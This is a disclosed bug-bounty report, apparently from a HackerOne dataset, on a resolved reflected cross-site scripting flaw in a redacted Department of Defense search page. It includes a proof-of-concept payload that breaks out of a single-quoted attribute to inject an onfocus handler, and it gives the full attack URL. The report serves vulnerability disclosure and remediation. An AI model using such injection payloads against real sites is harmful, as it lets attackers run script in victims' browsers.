---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1033253'
original_report_id: '1033253'
title: Reflected Xss in [██████]
weakness: Cross-site Scripting (XSS) - Generic
team_handle: deptofdefense
created_at: '2020-11-12T22:41:45.942Z'
disclosed_at: '2022-09-06T19:32:54.279Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Xss in [██████]

## Metadata

- HackerOne Report ID: 1033253
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: deptofdefense
- Disclosed At: 2022-09-06T19:32:54.279Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
Reflected XSS in █████████ due to unsanitized single quote `'`. 
## Impact
An attacker could execute arbitrary javascript, and perform malicious actions !

## Step-by-step Reproduction Instructions

1. Used payload:  `simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`
2. Visit the url, the alert box should pop up !:   
`https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`

█████████

## Suggested Mitigation/Remediation Actions
Sanitize single quote !

## Impact

An attacker could execute arbitrary javascript in the client browser .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
